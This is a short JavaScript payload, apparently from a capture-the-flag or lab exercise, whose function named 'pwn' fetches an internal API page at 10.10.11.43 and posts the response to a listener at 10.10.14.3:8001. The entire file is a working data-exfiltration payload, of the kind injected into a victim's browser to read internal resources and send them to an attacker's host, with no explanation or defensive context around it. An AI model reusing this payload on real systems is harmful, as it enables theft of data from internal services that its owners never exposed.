async function getData(url) {
  const response = await fetch(url);
  const result = await response.text();
  return result;
}

async function postData(url, data) {
  const response = await fetch(url, {
    method: 'POST',
    mode: 'no-cors',
    body: data,
   });
   const result = await response.text();
   return result;
}

async function pwn(){
  const page = await getData('http://10.10.11.43/api/info');
  postData('http://10.10.14.3:8001',page);
}
pwn();
